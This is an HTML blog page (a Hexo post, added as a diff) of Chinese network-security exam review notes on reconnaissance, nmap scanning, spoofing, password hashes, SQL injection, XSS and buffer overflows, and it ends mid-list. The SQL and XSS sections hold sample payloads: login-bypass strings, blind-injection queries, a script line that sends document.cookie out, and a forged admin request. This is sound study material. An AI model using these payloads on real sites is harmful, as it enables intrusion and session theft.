@@ -1,0 +1,2435 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Jason_xi">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Jason_xi">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="一步一个脚印">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>网络安全复习 · Supersnail&#39;s advance</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/boy.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >fi3ework&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">网络安全复习</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>fi3ework's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            网络安全复习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">5,513</span>阅读时长: <span class="post-count reading-time">21 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/14</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><h2 id="安全主要威胁"><a href="#安全主要威胁" class="headerlink" title="安全主要威胁"></a>安全主要威胁</h2><ul>
+<li>特洛伊木马</li>
+<li>黑客攻击</li>
+<li>内部、外部泄密</li>
+<li>计算机病毒</li>
+<li>信息丢失、篡改、销毁</li>
+<li>内部、外部泄密</li>
+<li>蠕虫</li>
+<li>拒绝服务攻击</li>
+<li>逻辑炸弹</li>
+<li>后门、隐蔽通道</li>
+</ul>
+<h2 id="CIA三元组"><a href="#CIA三元组" class="headerlink" title="CIA三元组"></a>CIA三元组</h2><ul>
+<li>机密性</li>
+<li>完整性</li>
+<li>可用性</li>
+</ul>
+<h2 id="网络攻击类型"><a href="#网络攻击类型" class="headerlink" title="网络攻击类型"></a>网络攻击类型</h2><h3 id="安全属性分5类"><a href="#安全属性分5类" class="headerlink" title="安全属性分5类:"></a>安全属性分5类:</h3><p>阻断、截取、篡改、伪造、重放攻击</p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式:"></a>攻击方式:</h3><ul>
+<li>主动:伪装、回答、修改报文、拒绝服务。</li>
+<li>被动攻击:报文内容泄露、通信分析。</li>
+</ul>
+<h2 id="OSI安全体系："><a href="#OSI安全体系：" class="headerlink" title="OSI安全体系："></a>OSI安全体系：</h2><h3 id="5类安全服务"><a href="#5类安全服务" class="headerlink" title="5类安全服务:"></a>5类安全服务:</h3><p>机密性、完整性、访问控制、不可否认、鉴别；  </p>
+<h3 id="8种安全机制："><a href="#8种安全机制：" class="headerlink" title="8种安全机制："></a>8种安全机制：</h3><p>访问控制、公证、路由控制、流量填充、身份认证交换、数字签名、信息完整性、加密   </p>
+<hr>
+<h1 id="第一章-攻击流程和渗透测试"><a href="#第一章-攻击流程和渗透测试" class="headerlink" title="第一章 攻击流程和渗透测试"></a>第一章 攻击流程和渗透测试</h1><h2 id="黑客攻击流程"><a href="#黑客攻击流程" class="headerlink" title="黑客攻击流程"></a>黑客攻击流程</h2><p><img src="https://i.imgur.com/Xmtwn9i.png" alt=""><br>踩点：确定目标地址范围、查询名字空间、收集信息<br>扫描：评估目标系统，识别监听业务<br>查点：识别目标系统上合法用户账户和保护力不够的共享资源<br>获取访问权：利用收集的足够数据，访问目标系统<br>提权：寻找系统完全控制<br>窃取信息:通过信息获取确定目标系统的入侵机制和途径<br>掩踪灭迹:擦除访问痕迹<br>创建后门：系统中留下后门和陷阱，为下次入侵创造条件<br>拒绝服务:无法取得特权，使用漏洞代码使目标系统瘫痪  </p>
+<h2 id="搜索引擎技巧"><a href="#搜索引擎技巧" class="headerlink" title="搜索引擎技巧:"></a>搜索引擎技巧:</h2><ul>
+<li>site: 具体网站  //site: cumt.edu.cn    </li>
+<li>link:链接到URL网页 //link: cumt.edu.cn  </li>
+<li>inurl:包含第一个关键词,其他在链接或网页文档 //inurl: cumt 计算机</li>
+<li>allinurl:链接包含查询关键词  </li>
+<li>allintitle&amp;intitle类似上   </li>
+<li>related、cache、info等  //related:<a href="http://www.cumt.edu.com/index.html" target="_blank" rel="noopener">www.cumt.edu.com/index.html</a></li>
+</ul>
+<h2 id="渗透测试七个阶段："><a href="#渗透测试七个阶段：" class="headerlink" title="渗透测试七个阶段："></a>渗透测试七个阶段：</h2><ul>
+<li>前期交互 </li>
+<li>情报搜集</li>
+<li>威胁建模 </li>
+<li>漏洞分析</li>
+<li>渗透攻击</li>
+<li>后渗透攻击</li>
+<li>报告</li>
+</ul>
+<p>分类：</p>
+<ul>
+<li><p>白盒测试（White-boxTesting，内部测试）：拥有组织机构的内部知识的情况下进行的渗透测试</p>
+</li>
+<li><p>灰盒测试（Gray-box Testing）</p>
+</li>
+<li><p>黑盒测试（Black-boxTesting，外部测试）：模拟一个对组织机构一无所知的攻击者所进行的渗透攻击<br><img src="https://i.imgur.com/c2bvuEQ.png" alt=""></p>
+</li>
+</ul>
+<h2 id="踩点"><a href="#踩点" class="headerlink" title="踩点"></a>踩点</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>确定目标地址范围、查询名字空间、收集信息</strong></p>
+<h2 id="途径"><a href="#途径" class="headerlink" title="途径"></a>途径</h2><p>1.WHOIS查询：获得域名和IP地址注册信息<br>2.DNS查询：</p>
+<ul>
+<li>工具作用：</li>
+</ul>
+<p>nslookup(查询域名信息或诊断DNS服务器问题)、dig(域名解析)、fierce(暴力破解DNS)</p>
+<ul>
+<li>命令作用：</li>
+</ul>
+<p>host:主机名<->网际地址<br>traceroute:路由追踪</-></p>
+<p>3.公开渠道获取信息<br>4.网络侦查   </p>
+<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>基本步骤：  </p>
+<p>确定目标系统是否真实存在-&gt;确定目标系统上那些服务正在运行或监听-&gt;探查操作系统  </p>
+<p>nmap:</p>
+<pre><code>-sP：进行ping扫描
+-sn:  Ping Scan - disable port scan  #ping探测扫描主机， 不进行端口扫描 （测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）
+-sA （发送tcp的ack包进行探测，可以探测主机是否存活）
+-sS ：半开放扫描（非3次握手的tcp扫描）/*优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高
+缺点：它需要root/administrator权限执行*/
+-sT：3次握手方式tcp的扫描 #效率低，速度慢，不需要root
+-sU：udp端口的扫描 #如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.udp端口扫描速度比较慢
+-sF：也是tcp的扫描一种，发送一个FIN标志的数据包
+-sX：圣诞树扫描
+-sN：空(NULL)扫描
+-sW：窗口扫描
+-sV：版本检测
+</code></pre><p>Nessus/OpenVAS:<br>主机扫描/端口扫描/OS识别/漏洞扫描</p>
+<h2 id="查点"><a href="#查点" class="headerlink" title="查点"></a>查点</h2><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>识别目标系统上合法用户账户和保护力不够的共享资源。</p>
+<h2 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h2><ul>
+<li><p>用户账号名（用于随后的口令猜测攻击）</p>
+</li>
+<li><p>错误配置的共享资源（如不安全的文件共享）</p>
+</li>
+<li><p>具有已知安全性漏洞的旧版本软件（如存在远程缓冲区溢出的web服务器）</p>
+<h3 id="旗标抓取"><a href="#旗标抓取" class="headerlink" title="旗标抓取"></a>旗标抓取</h3><p>telnet<br><code>telnet www.cumt.edu.cn 80</code><br>netcat<br><code>nc -v 163.com 80</code></p>
+</li>
+</ul>
+<h1 id="第二章网络嗅探"><a href="#第二章网络嗅探" class="headerlink" title="第二章网络嗅探"></a>第二章网络嗅探</h1><ul>
+<li>共享式局域网</li>
+<li>交换式局域网（溢出攻击、ARP欺骗）</li>
+</ul>
+<p>嗅探软件工作机制:</p>
+<ul>
+<li>驱动程序支持<br>将网卡设置成混杂模式，捕获数据包并提交上层协议<br>软件处理</li>
+<li>分组捕获过滤机制：<br>网卡上传的数据帧有两个去处：正常的协议栈或分组<br>捕获过滤模块，对于非本地的数据包，前者会丢弃，后<br>者则根据上层应用要求来决定是否丢弃</li>
+</ul>
+<p>网卡工作模式：</p>
+<ul>
+<li>广播:广播信息</li>
+<li>组播:组播数据</li>
+<li>单播：目的地址匹配本机MAC地址数据帧</li>
+<li>混杂：接收一切数据帧</li>
+</ul>
+<p>网络监听的防御：<br>被动防御：</p>
+<ul>
+<li>采用安全的网络拓扑结构和数据加密技术（网络分段、VLAN、）</li>
+<li>数据通道加密(SSH、SSL、VPN)</li>
+<li>数据内容加密</li>
+</ul>
+<p>交换网络下防监听：</p>
+<pre><code>1 不要把网络安全信任关系建立在单一的IP或MAC基础上，理想的关系应该建立在IP-MAC的对应关系上
+2 使用静态ARP或者IP-MAC对照表代替动态的ARP或者IP-MAC对应表——禁止自动更新，使用手动更新
+3 定期检查ARP请求：使用ARP监视工具如ARPWatch等监视并探测arp欺骗
+4 制定良好的安全管理策略，加强用户安全意识
+</code></pre><p>Winpcap基于混杂模式进行嗅探<br><img src="https://i.imgur.com/yHdzyKa.png" alt=""></p>
+<h1 id="第三章口令破解与防御"><a href="#第三章口令破解与防御" class="headerlink" title="第三章口令破解与防御"></a>第三章口令破解与防御</h1><p>Windows:<br><strong>安全账户管理器SAM机制（C:\Windows\system32\config\SAM)</strong><br>1.SAM:<br>包含本地系统所有用户名和口令的Hash值 </p>
+<p>2.口令Hash:<br>LM和NTLMv2</p>
+<p>LM:</p>
+<pre><code>1.将口令全部转换为大写
+2.添加NULL字符，直到口令长度等于14字符，并转化为二进制字符串
+3.将新口令拆分为两组7位打的字符串
+4.分别经过str_to_key()函数处理创建两个DES加密密钥，并未每一组添加奇偶校验位，创建出64位的密钥
+5.使用每个DES密钥加密一个预定义的魔术字符串，获得两个8字节的密文值
+6.密文值链接成16字节的值，即最终获得的LM哈希。
+</code></pre><p>缺陷：</p>
+<pre><code>1.des算法密钥太短
+2.69^7种可能，可以暴力破解
+3.如果密码长度&lt;=7,则第二部分hash为固定值，因此很容易确定密码的长度范围。
+4.Hash值在通过网络发送到服务器的时候，没有进行salting操作，容易遭受中间人攻击和重放攻击。
+</code></pre><p>3.安全标示RID：在账号创建是被创建，账号删除时，RID也同时删除，及时用户名相同，每次创建时获得的RID也不同。</p>
+<p>4.hash密码格式:<br>用户名:RID:LM-HASH值：NT-HASH值   </p>
+<p><strong>Linux</strong>:<br>修改密码:passwd<br><strong>/etc/passwd：用户名及基本信息</strong><br><strong>/etc/shadow： 影子密码文件,加密过的密码及失效时间 </strong><br>/etc/group:所有组<br>/etc/gshadow:所有组的群组影子密码文件</p>
+<ul>
+<li>过去:单向函数crypt(),基于DES算法</li>
+<li>现在：crypt16() 口令+salt=不同加密口令（md5)     MCF(模块化加密模式)</li>
+</ul>
+<h2 id="命令功能及使用"><a href="#命令功能及使用" class="headerlink" title="命令功能及使用"></a>命令功能及使用</h2><ul>
+<li>chmod:修改文件权限位  </li>
+<li>passwd/gpasswd 密码修改  </li>
+<li>usermod/groupmod 用户账户修改   </li>
+</ul>
+<h1 id="第四章欺骗技术与防御"><a href="#第四章欺骗技术与防御" class="headerlink" title="第四章欺骗技术与防御"></a>第四章欺骗技术与防御</h1><h2 id="0x01-IP欺骗"><a href="#0x01-IP欺骗" class="headerlink" title="0x01 IP欺骗"></a>0x01 IP欺骗</h2><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>IP协议:非面向连接，连接依靠双方IP地址</p>
+<p>IP欺骗的方式：<br>简单的IP地址更改:简单IP地址更改，<strong>盲目飞行攻击和单向攻击</strong><br>源路由攻击：<strong>确保目标主机返回的数据流</strong>，宽松源站LSR/严格源站SRS<br>TCP会话劫持：接管现存动态会话的过程。即攻击者替代原来的合法用户，同时监视并掌握会话内容（<strong>被冒充者会被迫下线</strong>）</p>
+<p>序列号机制：<br>序列号用来说明接收方下一步将要接收的数据包的顺序,猜测 一个属于发送方的序列号和另一个属于接收方的应答号。</p>
+<p>劫持过程</p>
+<ul>
+<li>发现攻击目标</li>
+<li>确认动态会话</li>
+<li><strong>猜测序列号</strong>(会话劫持关键)</li>
+<li>使客户主机下线（DOS）</li>
+<li>接管会话<h3 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h3></li>
+<li>就其实现原理而言，任何使用Internet进行通信 的主机都有可能受到这种攻击</li>
+<li>产生了简单适用的会话劫持攻击软件，技术门槛的 降低导致了很多“少年攻击者”的诞生.<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3>1.防范基本的IP欺骗</li>
+<li>入口过滤：不允许外网的数据包使用单位内部地址作为源地址</li>
+<li>出口过滤：内网到内网主机的流量不允许流出</li>
+</ul>
+<p>2.防范源路由欺骗<br>设置路由器禁用源路由</p>
+<p>3.防范会话劫持<br>加密、安全协议(SSH而非Telnet)、对信息进行限制保护</p>
+<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ol>
+<li>工作原理: IP地址=&gt;MAC地址（广播）  </li>
+<li>ARP协议有ARP请求包和ARP应答包</li>
+<li>主机和网关都有ARP缓存表，就是IP-MAC地址对，分静态和动态。(arp -a可进行查看)</li>
+<li>ARP欺骗原理（中间人）：</li>
+</ol>
+<p><img src="https://i.imgur.com/22ig6XD.png" alt=""></p>
+<h3 id="后果-1"><a href="#后果-1" class="headerlink" title="后果"></a>后果</h3><ul>
+<li>导致同网段的其他用户无法正常上网.</li>
+<li>嗅探交换式局域网内的所有数据包，从而获取敏感信息.</li>
+<li>对信息进行篡改，修改重要信息，进而控制受害者会话.</li>
+</ul>
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>MAC地址绑定</li>
+<li>静态ARP缓存</li>
+<li>ARP服务器</li>
+<li>ARP欺骗防护软件(ARP防火墙)</li>
+<li>隔离进行ARP欺骗的主机<br>arp记录设置成静态:<code>arp -s ip mac</code><h1 id="第五章Web欺骗与防御"><a href="#第五章Web欺骗与防御" class="headerlink" title="第五章Web欺骗与防御"></a>第五章Web欺骗与防御</h1></li>
+</ul>
+<h2 id="SQL注入攻击原理"><a href="#SQL注入攻击原理" class="headerlink" title="SQL注入攻击原理"></a>SQL注入攻击原理</h2><ol>
+<li><p>利用Web应用对后台<strong>数据库查询语句</strong>处理存在的安全漏洞，提交一段精心构造的数据库查询代码，根据返回结果获取数据。（受影响系统：<strong>输入参数不检查和过滤的系统</strong>）</p>
+</li>
+<li><p>注入方法:<br>布尔型、时间延迟、报错型、可联合查询、多语句查询注入等</p>
+</li>
+<li><p>GET:提交信息显示在URL</p>
+</li>
+<li>POST:不显示</li>
+<li>注入过程<br>假设查询语句<br><code>select * from users where userID=&#39;$name&#39; and userPasswd=&#39;$passwd&#39;</code></li>
+</ol>
+<p>可闭合单引号进行绕过</p>
+<p><code>admin/1234567&#39; or &#39;1&#39;=&#39;1</code>或<code>admin/1234567&#39; or &#39;1&#39;=&#39;1&#39;#</code>或<br><code>admin&#39; or &#39;1&#39;=&#39;1&#39;#/1234567</code></p>
+<h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><p>复习盲注:<br>1.测试漏洞</p>
+<pre><code>and 1=2,and 1=1;
+</code></pre><p>2.猜字段</p>
+<pre><code>and exists(select * from admin);
+and exists(select id from admim);
+and exists(select username from admin);
+and exists(select passwd from admin);
+</code></pre><p>3.猜用户名和长度</p>
+<pre><code>and exists(select id from admin where id=1);
+and exists(select id from admin where len(username)=5 and id=1);
+and exists(select id from admin where len(passwd)=10 and id=1)
+</code></pre><p>4.猜测用户名</p>
+<pre><code>and 1=(select id from (select * from admin where id=1) where asc(mid(usernam,1,1))&lt;100)
+1=(select id from (select * from admin where id=1) where asc(mid(usernam,1,1))&lt;50)
+</code></pre><p>折半查找<br>    当&lt;变=可确定ascii对应的字符<br>    and 1=(select id from (select * from admin where id=1) where username=’admin’;</p>
+<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ol>
+<li>使用预编译语句，绑定变量</li>
+<li>用户提交的数据和输入参数进行严格过滤(,’;select delete from union 等)</li>
+<li>摒弃动态SQL语句，改用存储过程来访问和操作数据</li>
+<li>使用安全函数:OWASP、ESAPI</li>
+<li>最小权限原则</li>
+</ol>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>原理：<br>攻击者往Web页面里插入恶意html代码，当用户浏览该网页时，嵌入其中的恶意代码被执行，达到特殊目的。<br>分类</p>
+<ul>
+<li>反射型XSS：需要主动点击</li>
+<li>存储式XSS：脚本永久存储目标服务器数据库或文件</li>
+<li>DOM型XSS：客户端浏览器对请求页面进行DOM渲染(不需要服务器解析响应，浏览器DOM解析触发)</li>
+</ul>
+<p>举例：</p>
+<pre><code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;link&lt;/a&gt;
+构造 &#39;onclick=alert(&quot;xss&quot;)//
+构造 &#39;&gt;&lt;img src=# onerror=alert(&quot;xss&quot;)/&gt;&lt;&#39;
+</code></pre><p>发起条件：</p>
+<ul>
+<li>Web服务器允许用户在表格或编辑框中输入不相关<br>的字符</li>
+<li>Web服务器存储并允许把用户输入显示在返回给终<br>端用户的页面上，而没有去除非法字符或者重新进行编码。</li>
+</ul>
+<p>跨站脚本攻击的两个条件：</p>
+<ul>
+<li>存在跨站脚本漏洞的web应用程序</li>
+<li>用户点击连接或者访问某一页面</li>
+</ul>
+<h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><pre><code>&lt;a href&gt;=&quot;http://www.baidu.com&quot;&gt;baidu&lt;/A&gt;
+&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;&quot;
+</code></pre><p>cookie发送远程代码<br><code>javascript: window.location=&#39;link?&#39;+document.cookie</code></p>
+<p>论坛管理员修改权限操作<br><code>admin_user.asp?&amp;username=xxx&amp;membercode=yyy</code><br>先获取管理员权限后构造<br><code>&lt;img src=window.location=&#39;http://127.0.0.1/admin_user.asp?&amp;username=xxx&amp;membercode=yyy&#39;&gt;</code></p>
+<h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><ol>
+<li>对用户来说，教育为主。<br>注意可疑链接，可装入一些浏览器插件如Firefox的NoScript</li>
+<li>Web应用开发者</li>
+</ol>
+<ul>
+<li>对所有用户提交内容进行可靠的输入验证(URL、POST数据)</li>
+<li>保护所有敏感的功能，以防被机器人自动执行或被第三方网站执行。(session标记、验证码)</li>
+</ul>
+<p>其他Web攻击类型：<br>CSRF、失效的身份认证和会话管理、不安全对象的直接引用、安全配置错误、敏感信息泄露、</p>
+<h1 id="第六章缓冲区溢出漏洞"><a href="#第六章缓冲区溢出漏洞" class="headerlink" title="第六章缓冲区溢出漏洞"></a>第六章缓冲区溢出漏洞</h1><h2 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h2><p>向固定长度的缓冲区中写入超出其预定长度的内容，造成缓冲区数据溢出，从而覆盖缓冲区周围的内存空间。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>程序在内存存放形式：一段连续的内存块，包括代码段、数据段和堆栈段。</p>
+<ul>
+<li>代码段(.text)：程序的机器码和只读数据，只读。</li>
